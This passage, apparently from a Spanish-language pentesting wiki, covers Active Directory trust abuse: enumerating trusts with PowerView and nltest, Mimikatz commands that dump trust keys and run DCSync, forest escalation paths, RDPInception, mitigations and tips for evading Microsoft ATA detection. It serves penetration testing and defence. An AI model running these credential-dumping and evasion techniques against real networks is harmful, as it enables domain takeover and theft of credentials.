- **Access Control Lists (ACLs)**: Los principales podrían estar especificados en una **ACL**, particularmente como entidades en **ACEs** dentro de una **DACL**, proporcionándoles acceso a recursos específicos. Para quienes quieran profundizar en la mecánica de ACLs, DACLs y ACEs, el whitepaper titulado “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” es un recurso invaluable.

### Encontrar usuarios/grupos externos con permisos

Puedes revisar **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** para encontrar foreign security principals en el dominio. Estos serán user/group de **un domain/forest externo**.

Puedes comprobar esto en **Bloodhound** o usando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Otras formas de enumerar los trusts de dominio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Hay **2 claves de confianza**, una para _Child --> Parent_ y otra para _Parent_ --> _Child_.\
> Puedes ver cuál usa el dominio actual con:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalar a Enterprise admin en el dominio hijo/padre abusando de la confianza con SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Comprender cómo se puede explotar el Configuration Naming Context (NC) es crucial. El Configuration NC sirve como repositorio central para los datos de configuración a través de un bosque en entornos de Active Directory (AD). Estos datos se replican a cada Domain Controller (DC) dentro del bosque, y los DCs con permisos de escritura mantienen una copia escribible del Configuration NC. Para explotarlo, se deben tener **privilegios SYSTEM en un DC**, preferiblemente un DC del dominio hijo.

**Vincular GPO al sitio raíz del DC**

El contenedor Sites del Configuration NC incluye información sobre los sitios de todos los equipos unidos al dominio dentro del bosque de AD. Al operar con privilegios SYSTEM en cualquier DC, los atacantes pueden vincular GPOs a los sitios raíz de los DC. Esta acción puede comprometer potencialmente el dominio raíz al manipular las políticas aplicadas a esos sitios.

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Un vector de ataque implica dirigirse a gMSAs privilegiadas dentro del dominio. La KDS Root key, esencial para calcular las contraseñas de las gMSAs, se almacena en el Configuration NC. Con privilegios SYSTEM en cualquier DC, es posible acceder a la KDS Root key y calcular las contraseñas de cualquier gMSA en todo el bosque.

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Este método requiere paciencia: esperar la creación de nuevos objetos privilegiados de AD. Con privilegios SYSTEM, un atacante puede modificar el AD Schema para otorgar a cualquier usuario control total sobre todas las clases. Esto podría derivar en acceso y control no autorizados sobre los objetos de AD recién creados.

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

La vulnerabilidad ADCS ESC5 apunta a obtener control sobre objetos de Public Key Infrastructure (PKI) para crear una plantilla de certificado que permita autenticarse como cualquier usuario dentro del bosque. Dado que los objetos PKI residen en el Configuration NC, comprometer un DC hijo escribible permite ejecutar ataques ESC5.

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenarios lacking ADCS, the attacker has the capability to set up the necessary components, as discussed in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
En este escenario, un dominio externo confía en tu dominio, otorgándote **permisos indeterminados** sobre él. Necesitarás averiguar **qué principals de tu dominio tienen qué acceso sobre el dominio externo** y luego intentar explotarlo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Dominio de bosque externo - Unidireccional (Saliente)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
En este escenario **tu dominio** está **confiando** algunos **privilegios** a un principal de **dominios diferentes**.

Sin embargo, cuando un **dominio es confiado** por el dominio que confía, el dominio confiado **crea un usuario** con un **nombre predecible** que usa como **contraseña la contraseña de confianza**. Esto significa que es posible **acceder a un usuario del dominio que confía para ingresar al dominio confiado** para enumerarlo e intentar escalar más privilegios:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Otra forma de comprometer el dominio confiado es encontrar un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) creado en la **dirección opuesta** de la confianza de dominio (lo cual no es muy común).

Otra forma de comprometer el dominio confiado es esperar en una máquina a la que un **user from the trusted domain can access** pueda iniciar sesión vía **RDP**. Luego, el atacante podría inyectar código en el proceso de la sesión RDP y **acceder al dominio de origen de la víctima** desde allí.\
Además, si la **víctima montó su disco duro**, desde el proceso de la **RDP session** el atacante podría almacenar **backdoors** en la **startup folder of the hard drive**. Esta técnica se llama **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigación del abuso de confianza entre dominios

### **SID Filtering:**

- El riesgo de ataques que aprovechan el atributo SIDHistory a través de confianzas entre bosques se mitiga mediante SID Filtering, que está activado por defecto en todas las confianzas inter-bosque. Esto se sustenta en la suposición de que las confianzas intra-bosque son seguras, considerando el bosque, en lugar del dominio, como el límite de seguridad según la postura de Microsoft.
- Sin embargo, hay una pega: SID filtering podría interrumpir aplicaciones y el acceso de usuarios, lo que conduce a su desactivación ocasional.

### **Selective Authentication:**

- Para confianzas inter-bosque, emplear Selective Authentication asegura que los usuarios de los dos bosques no se autentiquen automáticamente. En su lugar, se requieren permisos explícitos para que los usuarios accedan a dominios y servidores dentro del dominio o bosque que confía.
- Es importante notar que estas medidas no protegen frente a la explotación del writable Configuration Naming Context (NC) ni frente a ataques contra la cuenta de confianza.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Algunas defensas generales

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Medidas defensivas para la protección de credenciales**

- **Domain Admins Restrictions**: Se recomienda que Domain Admins solo puedan iniciar sesión en Domain Controllers, evitando su uso en otros hosts.
- **Service Account Privileges**: Los servicios no deberían ejecutarse con privilegios de Domain Admin (DA) para mantener la seguridad.
- **Temporal Privilege Limitation**: Para tareas que requieran privilegios DA, su duración debe limitarse. Esto se puede lograr con: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **Implementar técnicas de decepción**

- Implementar decepción implica colocar trampas, como usuarios o equipos señuelo, con características como contraseñas que no expiran o que están marcadas como Trusted for Delegation. Un enfoque detallado incluye crear usuarios con derechos específicos o añadirlos a grupos de alto privilegio.
- Un ejemplo práctico implica usar herramientas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Más sobre el despliegue de técnicas de decepción puede encontrarse en [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificando la decepción**

- **For User Objects**: Indicadores sospechosos incluyen ObjectSID atípico, inicios de sesión poco frecuentes, fechas de creación y bajos conteos de contraseñas incorrectas.
- **General Indicators**: Comparar atributos de posibles objetos señuelo con los de objetos genuinos puede revelar inconsistencias. Herramientas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) pueden ayudar a identificar tales engaños.

### **Evasión de sistemas de detección**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Evitar la enumeración de sesiones en Domain Controllers para prevenir la detección por ATA.
- **Ticket Impersonation**: Utilizar claves **aes** para la creación de tickets ayuda a evadir la detección al no degradar a NTLM.
- **DCSync Attacks**: Se recomienda ejecutar desde un equipo que no sea Domain Controller para evitar la detección por ATA, ya que la ejecución directa desde un Domain Controller generará alertas.

## Referencias

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

{{#include ../../banners/hacktricks-training.md}}
